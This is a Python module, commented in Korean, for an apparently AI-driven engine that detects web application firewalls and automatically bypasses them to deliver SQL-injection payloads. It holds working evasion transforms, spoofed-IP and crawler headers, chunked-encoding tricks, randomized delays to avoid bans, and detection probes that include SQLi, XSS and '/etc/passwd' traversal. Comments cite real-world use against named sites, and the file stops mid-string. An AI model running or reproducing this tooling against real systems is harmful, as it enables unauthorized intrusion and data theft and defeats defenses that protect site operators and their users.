"""
WAF Bypass Engine — 실전 경험 기반 WAF 우회 모음
urimoney(Nginx/OpenResty 406), cloudflare, ModSecurity 등
AI가 WAF 종류를 보고 우회 기법을 자동 선택
"""
from __future__ import annotations
import re
import time
import random
import urllib.parse
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable

from .http_probe import HttpProbe, ProbeResult


# ══════════════════════════════════════════════════════════════
# WAF 탐지 시그니처
# ══════════════════════════════════════════════════════════════
WAF_SIGNATURES: dict[str, dict] = {
    "cloudflare": {
        "status": [403, 503],
        "body": ["cloudflare", "cf-ray", "just a moment", "__cf_bm", "ray id"],
        "header_key": "cf-ray",
    },
    "nginx_openresty": {        # urimoney 경험
        "status": [406, 403],
        "body": ["406 not acceptable", "openresty", "nginx"],
        "header_val": {"server": ["nginx", "openresty"]},
    },
    "modsecurity": {
        "status": [403, 406],
        "body": ["mod_security", "modsecurity", "not acceptable!", "406 not"],
        "header_key": "x-modsecurity",
    },
    "aws_waf": {
        "status": [403],
        "body": ["aws", "request blocked", "x-amzn-requestid"],
        "header_key": "x-amzn-requestid",
    },
    "sucuri": {
        "status": [403],
        "body": ["sucuri", "website firewall", "access denied"],
    },
    "akamai": {
        "status": [403],
        "body": ["akamai", "reference #", "access denied"],
    },
    "f5_bigip": {
        "status": [403],
        "body": ["the requested url was rejected", "f5"],
        "header_key": "x-cnection",
    },
    "fortiweb": {
        "status": [403],
        "body": ["fortiweb", "fortigate", "blocked by fortiweb"],
    },
    "safe3": {
        "status": [403, 200],
        "body": ["safe3waf", "安全狗", "safedog"],
    },
    "d_shield": {
        "status": [403],
        "body": ["d盾", "d_shield", "iis防火墙"],
    },
    "yunsuo": {
        "status": [403],
        "body": ["yunsuo", "云锁"],
    },
    # ── 신규 추가 WAF 시그니처 ──────────────────────────────────────
    "dotdefender": {
        "status": [403, 200],
        "body": ["dotdefender", "break-in attempt detected", "site guard",
                 "this request has been blocked"],
        "header_key": "x-dotdefender-denied",
    },
    "imperva": {
        "status": [403],
        "body": ["imperva", "incapsula", "request denied by incapsula",
                 "_imf", "incap_ses"],
        "header_key": "x-iinfo",
    },
    "wallarm": {
        "status": [403, 500],
        "body": ["wallarm", "wallarm-node", "you have been blocked"],
        "header_key": "x-wallarm-request-id",
    },
    "360wzws": {
        "status": [403],
        "body": ["360wzws", "wangzhan", "奇安信网站卫士"],
    },
    "anquanbao": {
        "status": [403],
        "body": ["anquanbao", "安全宝"],
    },
    "nginx_waf": {
        "status": [400, 403],
        "body": ["nginx waf", "bad request", "invalid request"],
        "header_val": {"server": ["nginx"]},
    },
    "generic": {
        "status": [403, 406, 501],
        "body": ["access denied", "forbidden", "blocked", "security", "firewall"],
    },
}

_WAF_STRATEGY_MEMORY: dict[str, dict[str, int]] = {}
_GENERIC_WAF_BODY_MARKERS = {
    "access denied",
    "forbidden",
    "request blocked",
    "this request has been blocked",
    "you have been blocked",
    "bad request",
    "invalid request",
}


# ══════════════════════════════════════════════════════════════
# WAF 우회 기법 라이브러리
# 실전 경험 + CyberSecurity-Skills 03-Exploitation 기반
# ══════════════════════════════════════════════════════════════

class WafBypassLib:
    """WAF 우회 기법 모음 — 각 기법은 (name, transform_fn) 쌍"""

    # ── 공백 우회 ───────────────────────────────────────────────
    SPACE_BYPASSES = [
        ("tab",            lambda s: s.replace(" ", "\t")),
        ("url_encoded_tab",lambda s: s.replace(" ", "%09")),
        ("newline",        lambda s: s.replace(" ", "%0a")),       # urimoney 경험!
        ("cr_newline",     lambda s: s.replace(" ", "%0d%0a")),
        ("mysql_comment",  lambda s: s.replace(" ", "/**/")),      # urimoney 경험!
        ("plus",           lambda s: s.replace(" ", "+")),
        ("no_space",       lambda s: s.replace(" ", "")),
        ("multi_comment",  lambda s: s.replace(" ", "/*!*/")),
    ]

    # ── 키워드 우회 ─────────────────────────────────────────────
    KEYWORD_BYPASSES = [
        ("double_keyword",     lambda s: re.sub(r'\b(select|union|and|or|where|from|order)\b',
                                                lambda m: m.group()*2, s, flags=re.I)),
        ("mixed_case",         lambda s: "".join(
                                    c.upper() if i % 2 == 0 else c.lower()
                                    for i, c in enumerate(s))),
        ("mysql_inline",       lambda s: re.sub(
                                    r'\b(SELECT|UNION|AND|OR|FROM|WHERE)\b',
                                    lambda m: f"/*!{m.group()}*/", s, flags=re.I)),
        ("url_encode_keywords",lambda s: re.sub(
                                    r'(select|union|and|or)',
                                    lambda m: urllib.parse.quote(m.group()), s, flags=re.I)),
        ("hex_encode",         lambda s: re.sub(
                                    r"'([^']+)'",
                                    lambda m: f"0x{m.group(1).encode().hex()}", s)),
        ("char_function",      lambda s: re.sub(
                                    r"'([a-zA-Z]+)'",
                                    lambda m: f"CHAR({','.join(str(ord(c)) for c in m.group(1))})",
                                    s)),
    ]

    # ── 인코딩 우회 ─────────────────────────────────────────────
    ENCODING_BYPASSES = [
        ("double_url_encode",  lambda s: urllib.parse.quote(urllib.parse.quote(s))),
        ("html_entity",        lambda s: s.replace("<", "&lt;").replace(">", "&gt;")),
        ("unicode_escape",     lambda s: re.sub(r"(['\"])", lambda m: f"%u00{ord(m.group()):02x}", s)),
        ("base64_payload",     lambda s: s),  # 특수 케이스 — 별도 처리
    ]

    # ── HTTP 헤더 조작 ──────────────────────────────────────────
    HEADER_BYPASSES = [
        ("xff_localhost",    {"X-Forwarded-For": "127.0.0.1"}),
        ("xff_10net",        {"X-Forwarded-For": "10.0.0.1"}),
        ("xff_192net",       {"X-Forwarded-For": "192.168.1.1"}),
        ("x_real_ip",        {"X-Real-IP": "127.0.0.1"}),
        ("x_originating_ip", {"X-Originating-IP": "127.0.0.1"}),
        ("x_remote_ip",      {"X-Remote-IP": "127.0.0.1, 127.0.0.1"}),
        ("x_client_ip",      {"X-Client-IP": "127.0.0.1"}),
        ("true_client_ip",   {"True-Client-IP": "127.0.0.1"}),
        ("cluster_client",   {"Cluster-Client-IP": "127.0.0.1"}),
        ("forwarded",        {"Forwarded": "for=127.0.0.1;proto=https"}),
    ]

    # ── User-Agent 우회 ─────────────────────────────────────────
    UA_BYPASSES = [
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
        "curl/7.68.0",
        "python-requests/2.31.0",
        "sqlmap/1.7.8#stable (https://sqlmap.org)",   # SQLMap UA 허용하는 경우
    ]

    # ── 경로/파라미터 변형 ──────────────────────────────────────
    PATH_BYPASSES = [
        ("double_slash",    lambda p: p.replace("/", "//")),
        ("dot_slash",       lambda p: p.replace("/", "/./")),
        ("url_encode_slash",lambda p: p.replace("/", "%2f")),
        ("semicolon",       lambda p: p.replace("?", ";?")),
        ("null_byte",       lambda p: p.replace("=", "=%00")),
        ("param_pollution", lambda p: p + "&" + p.split("?")[1] if "?" in p else p),
    ]

    # ── Content-Type 변형 ───────────────────────────────────────
    CONTENT_TYPE_BYPASSES = [
        "application/x-www-form-urlencoded",
        "application/x-www-form-urlencoded; charset=utf-8",
        "application/json",
        "text/plain",
        "multipart/form-data",
        "application/xml",
    ]

    # ── SQL 함수 대체 (IF/SLEEP/BENCHMARK 차단 시) ─────────────
    # WAF가 SLEEP, IF, BENCHMARK 함수명 자체를 차단할 때 사용
    FUNCTION_BYPASSES = [
        # IF(a,b,c) → CASE WHEN a THEN b ELSE c END
        ("case_when",
         lambda s: re.sub(
             r'\bIF\s*\(\s*(.+?)\s*,\s*(.+?)\s*,\s*(.+?)\s*\)',
             lambda m: f"CASE/**/WHEN/**/{m.group(1)}/**/THEN/**/{m.group(2)}/**/ELSE/**/{m.group(3)}/**/END",
             s, flags=re.I
         )),
        # SLEEP(n) → 무거운 서브쿼리로 타이밍 발생 (함수명 없음)
        ("heavy_subquery",
         lambda s: re.sub(
             r'\bSLEEP\s*\(\s*(\d+)\s*\)',
             lambda m: (
                 f"(SELECT/**/1/**/FROM/**/"
                 f"(SELECT/**/count(*)/**/FROM/**/information_schema.columns/**/A,"
                 f"information_schema.columns/**/B)x)"
             ),
             s, flags=re.I
         )),
        # BENCHMARK(n,expr) → 동일하게 무거운 서브쿼리 대체
        ("benchmark_sub",
         lambda s: re.sub(
             r'\bBENCHMARK\s*\(\s*\d+\s*,\s*.+?\s*\)',
             "(SELECT/**/count(*)/**/FROM/**/information_schema.columns/**/A,"
             "information_schema.columns/**/B)",
             s, flags=re.I
         )),
        # GREATEST(a,b) 활용 — OR/AND 비교 대체
        ("greatest_least",
         lambda s: re.sub(
             r'\b(\d+)\s*=\s*(\d+)\b',
             lambda m: (
                 f"GREATEST({m.group(1)},{m.group(2)})={m.group(2)}"
                 if m.group(1) == m.group(2)
                 else f"GREATEST({m.group(1)},{m.group(2)})!={min(m.group(1), m.group(2))}"
             ),
             s
         )),
        # AND → &&,  OR → ||  (키워드 자체 차단 시)
        ("logical_operator",
         lambda s: re.sub(r'\bAND\b', '&&', re.sub(r'\bOR\b', '||', s, flags=re.I), flags=re.I)),
        # UNION SELECT → UNION(개행)SELECT
        ("union_newline",
         lambda s: re.sub(r'\bUNION\s+SELECT\b', 'UNION%0aSELECT', s, flags=re.I)),
    ]

    # ── Unicode 변형 (고급) ──────────────────────────────────────
    # WAF가 ASCII 키워드를 탐지하지만 Unicode 정규화를 놓칠 때
    UNICODE_BYPASSES = [
        # 전각 문자 (Full-width) — 일부 WAF가 정규화 처리
        ("fullwidth_quote",   lambda s: s.replace("'", "\uff07").replace('"', "\uff02")),
        # Overlong UTF-8 인코딩 (레거시 파서 우회)
        ("overlong_slash",    lambda s: s.replace("/", "%c0%af")),
        # NULL 바이트 삽입 (C기반 파서 혼동)
        ("null_byte_inject",  lambda s: re.sub(r'\b(SELECT|UNION|AND|OR)\b',
                                               lambda m: m.group() + "%00", s, flags=re.I)),
        # HTML 엔티티 인코딩
        ("html_entity_sel",   lambda s: s.replace("SELECT", "S&#69;LECT")
                                         .replace("UNION", "UNI&#79;N")
                                         .replace("AND", "AN&#68;")),
    ]

    # ── HTTP Chunked Transfer Encoding 우회 ─────────────────────
    # Transfer-Encoding: chunked 로 분할 전송 → 일부 WAF 패턴 매칭 무력화
    @staticmethod
    def build_chunked_body(data: str, chunk_size: int = 3) -> tuple[bytes, dict]:
        """
        POST body를 chunked transfer encoding으로 분할.
        반환: (chunked_bytes, headers)
        WAF가 전체 body를 재조합하지 않으면 패턴 탐지 실패.
        """
        body = data.encode("utf-8")
        chunks = [body[i:i+chunk_size] for i in range(0, len(body), chunk_size)]
        chunked = b""
        for chunk in chunks:
            chunked += f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n"
        chunked += b"0\r\n\r\n"
        headers = {
            "Transfer-Encoding": "chunked",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        return chunked, headers

    # ── 요청 속도 제어 (IP 밴 방지) ────────────────────────────
    # 요청 간격을 랜덤하게 조절해서 WAF/IPS 자동 밴 회피
    @staticmethod
    def safe_delay(min_sec: float = 1.0, max_sec: float = 3.5) -> None:
        """랜덤 딜레이 — 고속 스캔 패턴 탐지 방지"""
        time.sleep(random.uniform(min_sec, max_sec))


# ══════════════════════════════════════════════════════════════
# WAF Detector
# ══════════════════════════════════════════════════════════════

@dataclass
class WafDetectResult:
    detected: bool
    waf_type: str
    confidence: str   # high / medium / low
    evidence: str
    bypass_priority: list[str] = field(default_factory=list)


class WafDetector:
    def __init__(self, probe: HttpProbe):
        self.probe = probe
        self.last_baseline: ProbeResult | None = None

    def detect(self, url: str) -> WafDetectResult:
        """다양한 페이로드로 WAF 탐지"""
        # 정상 요청 기준선
        base = self.probe.get(url)
        self.last_baseline = base

        # WAF 유발 페이로드들
        probes = [
            url + "?id=1'",
            url + "?id=1 UNION SELECT 1,2,3--",
            url + "?id=<script>alert(1)</script>",
            url + "?id=../../../etc/passwd",
            url + "?id=1 AND SLEEP(3)--",
        ]

        waf_responses = []
        for purl in probes:
            r = self.probe.get(purl, timeout=8)
            if r.status in (403, 406, 501, 503) or r.status != base.status:
                waf_responses.append(r)
            time.sleep(0.2)

        if not waf_responses:
            return WafDetectResult(detected=False, waf_type="none",
                                   confidence="high", evidence="정상 응답")

        # Score all responses. Header/body fingerprints outrank generic status
        # codes so an early 403 cannot incorrectly force a vendor profile.
        ranked: list[tuple[int, str, list[str], int]] = []
        for waf_name, sig in WAF_SIGNATURES.items():
            if waf_name == "generic":
                continue
            score = 0
            fingerprint_score = 0
            evidence: list[str] = []
            status = waf_responses[0].status
            for response in waf_responses:
                body_lower = response.body.lower()
                headers = {k.lower(): str(v).lower() for k, v in response.headers.items()}
                if "header_key" in sig and sig["header_key"] in headers:
                    score += 5
                    fingerprint_score += 5
                    evidence.append(f"header:{sig['header_key']}")
                for header_name, expected_values in sig.get("header_val", {}).items():
                    actual = headers.get(header_name.lower(), "")
                    if any(value.lower() in actual for value in expected_values):
                        score += 4
                        fingerprint_score += 4
                        evidence.append(f"header:{header_name}={actual[:40]}")
                body_hits = [
                    keyword for keyword in sig.get("body", [])
                    if keyword in body_lower
                    and keyword.lower() not in _GENERIC_WAF_BODY_MARKERS
                ]
                if body_hits:
                    score += 3 + min(len(body_hits), 2)
                    fingerprint_score += 3 + min(len(body_hits), 2)
                    evidence.append(f"body:{body_hits[0]}")
                if response.status in sig.get("status", []):
                    score += 1
                    status = response.status
            # Status codes overlap heavily between products. They can support a
            # fingerprint, but cannot identify a vendor by themselves.
            if fingerprint_score:
                ranked.append((score, waf_name, evidence, status))

        if ranked:
            score, waf_name, evidence, status = max(ranked, key=lambda item: item[0])
            confidence = "high" if score >= 5 else "medium"
            return self._make_result(
                waf_name,
                confidence,
                ", ".join(dict.fromkeys(evidence)) or f"Status: {status}",
                status,
            )

        # 탐지됐지만 종류 불명
        sample = waf_responses[0]
        return WafDetectResult(
            detected=True, waf_type="generic", confidence="medium",
            evidence=f"Status {sample.status} for attack payload",
            bypass_priority=["space", "header", "encoding", "keyword"],
        )

    def _make_result(self, waf_type: str, confidence: str, evidence: str,
                     status: int) -> WafDetectResult:
        # WAF 종류별 우선 우회 전략 — 실전 + 고급 기법 포함
        priority_map = {
            # Cloudflare: 더블인코딩, UA, Unicode 우선
            "cloudflare":       ["encoding", "unicode", "ua", "header", "space", "function"],
            # Nginx/OpenResty: 줄바꿈·주석 공백 우선 (urimoney 실전 확인)
            "nginx_openresty":  ["newline", "mysql_comment", "space", "keyword", "function"],
            # ModSecurity: 공백 다양화, 함수 대체
            "modsecurity":      ["space", "function", "keyword", "encoding", "header"],
            # AWS WAF: 인코딩, 헤더, 함수 대체
            "aws_waf":          ["encoding", "function", "header", "space", "keyword"],
            # Sucuri: UA, 헤더 위장
            "sucuri":           ["ua", "header", "encoding", "space"],
            # Akamai: 인코딩, 공백, 헤더
            "akamai":           ["encoding", "header", "space", "unicode"],
            # F5 BIG-IP: 공백, 키워드
            "f5_bigip":         ["space", "keyword", "encoding", "function"],
            # FortiWeb: 공백, 함수
            "fortiweb":         ["space", "function", "keyword", "header"],
            # 중국계 WAF (Safe3, D盾): 유니코드, 인코딩, 함수
            "safe3":            ["unicode", "encoding", "function", "space"],
            "d_shield":         ["unicode", "encoding", "function", "space"],
            "yunsuo":           ["unicode", "encoding", "function", "space"],
            "360wzws":          ["unicode", "encoding", "function", "space"],
            "anquanbao":        ["unicode", "encoding", "function", "space"],
            # dotDefender: 헤더 위장 + 공백 우선 (실전: kar.or.kr 경험)
            "dotdefender":      ["header", "space", "keyword", "chunked", "encoding"],
            # Imperva/Incapsula: UA + 헤더 + 인코딩
            "imperva":          ["ua", "header", "encoding", "space", "function"],
            # Wallarm: 함수 대체 + 인코딩 우선
            "wallarm":          ["function", "encoding", "space", "keyword", "header"],
            # Nginx WAF: 공백 + 함수 대체
            "nginx_waf":        ["space", "function", "keyword", "encoding"],
            # 범용
            "generic":          ["space", "keyword", "header", "encoding", "function"],
        }
        return WafDetectResult(
            detected=True, waf_type=waf_type, confidence=confidence,
            evidence=f"{evidence} (HTTP {status})",
            bypass_priority=priority_map.get(waf_type, ["space", "keyword", "header", "function"]),
        )


# ══════════════════════════════════════════════════════════════
# WAF Bypass Engine — AI 자율 선택
# ══════════════════════════════════════════════════════════════

@dataclass
class BypassAttempt:
    technique: str
    payload_original: str
    payload_modified: str
    headers_used: dict
    response_status: int
    response_body_preview: str
    bypassed: bool
    evidence: str = ""
    evidence_tier: str = "verified_transport"
    blocked_baseline_status: int = 0


class WafBypassEngine:
    """
    WAF가 탐지되면 자동으로 우회 기법을 순서대로 시도
    AI가 탐지 결과를 보고 최적 기법을 선택
    """

    def __init__(self, probe: HttpProbe, on_progress: Callable[[str], None] | None = None):
        self.probe = probe
        self.detector = WafDetector(probe)
        self.log = on_progress or (lambda s: None)
        self._baseline_response: ProbeResult | None = None
        self._blocked_response: ProbeResult | None = None

    def auto_bypass(
        self,
        url: str,
        payload: str,
        method: str = "GET",
        param: str = "id",
        post_data: dict | None = None,
    ) -> tuple[bool, BypassAttempt | None]:
        """
        WAF 자동 탐지 후 우회 기법 순서 시도
        성공 시 (True, 사용된 기법) 반환
        """
        # 1. WAF 탐지
        detect = self.detector.detect(url)
        self._baseline_response = self.detector.last_baseline
        if not detect.detected:
            self.log("  [WAF] WAF 없음 — 직접 공격 가능")
            return True, None

        # Record the exact original request as the blocked control. A response
        # from a different generic detector payload is not sufficient proof.
        exact_control = self._send(url, payload, method, param, post_data)
        if not self._response_is_blocked(exact_control):
            self.log("  [WAF] 원본 요청이 차단되지 않음 — 변형 불필요")
            return True, None
        self._blocked_response = exact_control

        self.log(f"  [WAF] 탐지됨: {detect.waf_type} (신뢰도: {detect.confidence})")
        host = urllib.parse.urlsplit(url).netloc.lower()
        memory_key = f"{host}|{detect.waf_type}"
        learned = _WAF_STRATEGY_MEMORY.setdefault(memory_key, {})
        priorities = sorted(
            detect.bypass_priority,
            key=lambda strategy: (-learned.get(strategy, 0), detect.bypass_priority.index(strategy)),
        )
        self.log(f"  [WAF] 우선 우회 전략: {priorities}")

        # 2. 우선순위 순서대로 우회 시도
        for strategy in priorities:
            success, attempt = self._try_strategy(
                strategy, url, payload, method, param, post_data, detect.waf_type
            )
            if success:
                learned[strategy] = learned.get(strategy, 0) + 2
                attempt.evidence = (
                    f"exact blocked control HTTP {exact_control.status} -> "
                    f"distinct HTTP {attempt.response_status} response"
                )
                attempt.evidence_tier = "verified_transport"
                attempt.blocked_baseline_status = exact_control.status
                self.log(f"  [WAF✓] 우회 성공: {strategy} → {attempt.technique}")
                return True, attempt
            learned[strategy] = learned.get(strategy, 0) - 1
            time.sleep(0.5)

        # 3. 전략별로 안 되면 조합 시도
        self.log("  [WAF] 단일 기법 실패 — 조합 시도...")
        success, attempt = self._try_combined(url, payload, method, param, post_data)
        if success:
            attempt.evidence = (
                f"exact blocked control HTTP {exact_control.status} -> "
                f"distinct HTTP {attempt.response_status} response"
            )
            attempt.evidence_tier = "verified_transport"
            attempt.blocked_baseline_status = exact_control.status
            self.log(f"  [WAF✓] 조합 우회 성공: {attempt.technique}")
            return True, attempt

        self.log("  [WAF✗] 현재 기법으로 우회 실패")
        return False, None

    def _try_strategy(
        self, strategy: str, url: str, payload: str,
        method: str, param: str, post_data: dict | None,
        waf_type: str,
    ) -> tuple[bool, BypassAttempt | None]:

        if strategy in ("newline", "mysql_comment", "space"):
            return self._try_space_bypass(url, payload, method, param, post_data)

        elif strategy == "keyword":
            return self._try_keyword_bypass(url, payload, method, param, post_data)

        elif strategy == "header":
            return self._try_header_bypass(url, payload, method, param, post_data)

        elif strategy == "encoding":
            return self._try_encoding_bypass(url, payload, method, param, post_data)

        elif strategy == "ua":
            return self._try_ua_bypass(url, payload, method, param, post_data)

        # ── 신규 고급 기법 ────────────────────────────────────────
        elif strategy == "function":
            return self._try_function_bypass(url, payload, method, param, post_data)

        elif strategy == "unicode":
            return self._try_unicode_bypass(url, payload, method, param, post_data)

        elif strategy == "chunked":
            return self._try_chunked_bypass(url, payload, method, param, post_data)

        return False, None

    def _try_space_bypass(self, url, payload, method, param, post_data):
        for name, transform in WafBypassLib.SPACE_BYPASSES:
            modified = transform(payload)
            r = self._send(url, modified, method, param, post_data)
            if self._is_bypassed(r):
                return True, BypassAttempt(
                    technique=f"space:{name}",
                    payload_original=payload, payload_modified=modified,
                    headers_used={}, response_status=r.status,
                    response_body_preview=r.body[:100],
                    bypassed=True,
                )
            time.sleep(0.2)
        return False, None

    def _try_keyword_bypass(self, url, payload, method, param, post_data):
        for name, transform in WafBypassLib.KEYWORD_BYPASSES:
            try:
                modified = transform(payload)
            except Exception:
                continue
            r = self._send(url, modified, method, param, post_data)
            if self._is_bypassed(r):
                return True, BypassAttempt(
                    technique=f"keyword:{name}",
                    payload_original=payload, payload_modified=modified,
                    headers_used={}, response_status=r.status,
                    response_body_preview=r.body[:100],
                    bypassed=True,
                )
            time.sleep(0.2)
        return False, None

    def _try_header_bypass(self, url, payload, method, param, post_data):
        for name, headers in WafBypassLib.HEADER_BYPASSES:
            r = self._send(url, payload, method, param, post_data, extra_headers=headers)
            if self._is_bypassed(r):
                return True, BypassAttempt(
                    technique=f"header:{name}",
                    payload_original=payload, payload_modified=payload,
                    headers_used=headers, response_status=r.status,
                    response_body_preview=r.body[:100],
                    bypassed=True,
                )
            time.sleep(0.2)
        return False, None

    def _try_encoding_bypass(self, url, payload, method, param, post_data):
        for name, transform in WafBypassLib.ENCODING_BYPASSES:
            try:
                modified = transform(payload)
            except Exception:
                continue
            r = self._send(url, modified, method, param, post_data)
            if self._is_bypassed(r):
                return True, BypassAttempt(
                    technique=f"encoding:{name}",
                    payload_original=payload, payload_modified=modified,
                    headers_used={}, response_status=r.status,
                    response_body_preview=r.body[:100],
                    bypassed=True,
                )
            time.sleep(0.2)
        return False, None

    def _try_ua_bypass(self, url, payload, method, param, post_data):
        for ua in WafBypassLib.UA_BYPASSES:
            r = self._send(url, payload, method, param, post_data,
                           extra_headers={"User-Agent": ua})
            if self._is_bypassed(r):
                return True, BypassAttempt(
                    technique=f"ua:{ua[:40]}",
                    payload_original=payload, payload_modified=payload,
                    headers_used={"User-Agent": ua}, response_status=r.status,
                    response_body_preview=r.body[:100],
                    bypassed=True,
                )
            time.sleep(0.15)
        return False, None

    def _try_function_bypass(self, url, payload, method, param, post_data):
        """
        [신규] SQL 함수 대체 우회:
        IF → CASE WHEN, SLEEP → heavy subquery, BENCHMARK → subquery,
        GREATEST/LEAST 비교, AND/OR → &&/||, UNION SELECT → UNION%0aSELECT
        """
        for name, transform in WafBypassLib.FUNCTION_BYPASSES:
            try:
                modified = transform(payload)
            except Exception:
                continue
            if modified == payload:
                continue  # 변환 없으면 건너뜀
            r = self._send(url, modified, method, param, post_data)
            if self._is_bypassed(r):
                return True, BypassAttempt(
                    technique=f"function:{name}",
                    payload_original=payload, payload_modified=modified,
                    headers_used={}, response_status=r.status,
                    response_body_preview=r.body[:100],
                    bypassed=True,
                )
            WafBypassLib.safe_delay(0.5, 1.5)
        return False, None

    def _try_unicode_bypass(self, url, payload, method, param, post_data):
        """
        [신규] Unicode/Overlong/HTML 엔티티 우회:
        전각 문자, Overlong UTF-8, NULL 바이트 삽입, HTML 엔티티
        """
        for name, transform in WafBypassLib.UNICODE_BYPASSES:
            try:
                modified = transform(payload)
            except Exception:
                continue
            if modified == payload:
                continue
            r = self._send(url, modified, method, param, post_data)
            if self._is_bypassed(r):
                return True, BypassAttempt(
                    technique=f"unicode:{name}",
                    payload_original=payload, payload_modified=modified,
                    headers_used={}, response_status=r.status,
                    response_body_preview=r.body[:100],
                    bypassed=True,
                )
            time.sleep(0.2)
        return False, None

    def _try_chunked_bypass(self, url, payload, method, param, post_data):
        """
        [신규] HTTP Chunked Transfer Encoding 우회:
        POST body를 3~7 바이트씩 분할 전송
        WAF가 재조합 없이 패턴 검사하면 탐지 실패
        """
        if method.upper() != "POST":
            return False, None  # POST 전용
        try:
            import socket as _socket

            # post_data 합치기
            data = dict(post_data or {})
            data[param] = payload
            body_str = urllib.parse.urlencode(data)

            # chunk 크기를 3, 5, 7 순으로 시도
            from urllib.parse import urlparse as _up
            parsed = _up(url)
            host = parsed.hostname or ""
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            path = parsed.path or "/"
            if parsed.query:
                path += "?" + parsed.query

            for chunk_size in (3, 5, 7, 1):
                chunked_body, ch_headers = WafBypassLib.build_chunked_body(body_str, chunk_size)
                # requests 는 chunked raw 전송 미지원 → httpx 또는 raw socket
                # 여기서는 httpx를 선택적으로 사용
                try:
                    import httpx
                    with httpx.Client(verify=False, timeout=12) as client:
                        resp = client.post(
                            url,
                            content=chunked_body,
                            headers=ch_headers,
                        )
                    status = resp.status_code
                    body = resp.text[:200]
                    headers_r: dict = dict(resp.headers)
                except ImportError:
                    return False, None

                candidate = ProbeResult(
                    url=url,
                    status=status,
                    body=body,
                    headers=headers_r,
                    elapsed=0.0,
                )
                if self._is_bypassed(candidate):
                    return True, BypassAttempt(
                        technique=f"chunked:chunk_size={chunk_size}",
                        payload_original=payload, payload_modified=body_str,
                        headers_used=ch_headers, response_status=status,
                        response_body_preview=body[:100],
                        bypassed=True,
                    )
                WafBypassLib.safe_delay(0.5, 1.2)
        except Exception:
            pass
        return False, None

    def _try_combined(self, url, payload, method, param, post_data):
        """
        [강화] 공백 + 키워드 + 헤더 + 함수대체 + 유니코드 조합
        기존 단일 기법 실패 후 다층 조합으로 시도
        """
        # 1차: 공백 + 키워드 + 헤더 (기존)
        for sp_name, sp_fn in WafBypassLib.SPACE_BYPASSES[:4]:
            for kw_name, kw_fn in WafBypassLib.KEYWORD_BYPASSES[:3]:
                for hdr_name, headers in WafBypassLib.HEADER_BYPASSES[:3]:
                    try:
                        modified = kw_fn(sp_fn(payload))
                    except Exception:
                        continue
                    r = self._send(url, modified, method, param, post_data,
                                   extra_headers=headers)
                    if self._is_bypassed(r):
                        return True, BypassAttempt(
                            technique=f"combined:{sp_name}+{kw_name}+{hdr_name}",
                            payload_original=payload, payload_modified=modified,
                            headers_used=headers, response_status=r.status,
                            response_body_preview=r.body[:100],
                            bypassed=True,
                        )
                    WafBypassLib.safe_delay(0.3, 0.8)

        # 2차: [신규] 함수 대체 + 공백 + 헤더 조합
        self.log("  [WAF] 함수 대체 + 공백 조합 시도...")
        for fn_name, fn_fn in WafBypassLib.FUNCTION_BYPASSES[:4]:
            for sp_name, sp_fn in WafBypassLib.SPACE_BYPASSES[:3]:
                for hdr_name, headers in WafBypassLib.HEADER_BYPASSES[:3]:
                    try:
                        modified = sp_fn(fn_fn(payload))
                    except Exception:
                        continue
                    if modified == payload:
                        continue
                    r = self._send(url, modified, method, param, post_data,
                                   extra_headers=headers)
                    if self._is_bypassed(r):
                        return True, BypassAttempt(
                            technique=f"combined_adv:{fn_name}+{sp_name}+{hdr_name}",
                            payload_original=payload, payload_modified=modified,
                            headers_used=headers, response_status=r.status,
                            response_body_preview=r.body[:100],
                            bypassed=True,
                        )
                    WafBypassLib.safe_delay(0.4, 1.0)

        # 3차: [신규] Unicode + 함수 대체 조합
        self.log("  [WAF] Unicode + 함수 대체 조합 시도...")
        for uni_name, uni_fn in WafBypassLib.UNICODE_BYPASSES[:3]:
            for fn_name, fn_fn in WafBypassLib.FUNCTION_BYPASSES[:3]:
                try:
                    modified = uni_fn(fn_fn(payload))
                except Exception:
                    continue
                if modified == payload:
                    continue
                r = self._send(url, modified, method, param, post_data)
                if self._is_bypassed(r):
                    return True, BypassAttempt(
                        technique=f"combined_uni:{uni_name}+{fn_name}",
                        payload_original=payload, payload_modified=modified,
                        headers_used={}, response_status=r.status,
                        response_body_preview=r.body[:100],
                        bypassed=True,
                    )
                WafBypassLib.safe_delay(0.3, 0.9)

        return False, None

    # ── 내부 헬퍼 ────────────────────────────────────────────────

    def _send(self, url: str, payload: str, method: str, param: str,
              post_data: dict | None, extra_headers: dict | None = None) -> ProbeResult:
        if method.upper() == "GET":
            target_url = re.sub(
                rf"({re.escape(param)}=)[^&]*",
                lambda m: m.group(1) + urllib.parse.quote(payload, safe=""),
                url,
            )
            if param not in url:
                target_url = url + ("&" if "?" in url else "?") + f"{param}={urllib.parse.quote(payload, safe='')}"
            return self.probe.get(target_url, headers=extra_headers)
        else:
            data = dict(post_data or {})
            data[param] = payload
            return self.probe.post(url, data, headers=extra_headers)

    def _is_bypassed(self, r: ProbeResult) -> bool:
        """Require an exact blocked control plus a distinct semantic response."""
        if self._response_is_blocked(r):
            return False
        blocked = self._blocked_response
        if blocked is None or not self._response_is_blocked(blocked):
            return False
        def normalize(body: str) -> str:
            return re.sub(r"\s+", " ", body or "").strip()[:4096]
        if r.status == blocked.status and normalize(r.body) == normalize(blocked.body):
            return False
        blocked_kw = ["access denied", "forbidden", "blocked", "not acceptable",
                      "security violation", "잘못된 접근", "차단"]
        body_lower = r.body.lower()
        if any(k in body_lower for k in blocked_kw):
            return False
        baseline = self._baseline_response
        if baseline is not None and r.status == baseline.status:
            # Passing the transport layer is not enough. The transformed
            # request must also differ from the clean application baseline.
            if normalize(r.body) == normalize(baseline.body):
                return False
        return True

    @staticmethod
    def _response_is_blocked(r: ProbeResult) -> bool:
        if r.error or r.status in (0, 400, 401, 403, 406, 429, 501, 503):
            return True
        return bool(re.search(
            r"access\s+denied|forbidden|request\s+(?:was\s+)?blocked|"
            r"not\s+acceptable|security\s+violation|waf|잘못된\s*접근|차단|"
            r"请求.*拦截|访问.*拒绝",
            r.body or "",
            re.I,
        ))

    def get_bypass_summary(self, waf_type: str) -> str:
        """DeepSeek V4 Pro 전달용 — WAF 우회 전략 상세 설명"""
        summaries = {
            "nginx_openresty": """
Nginx/OpenResty WAF (406 Not Acceptable) 우회 전략:
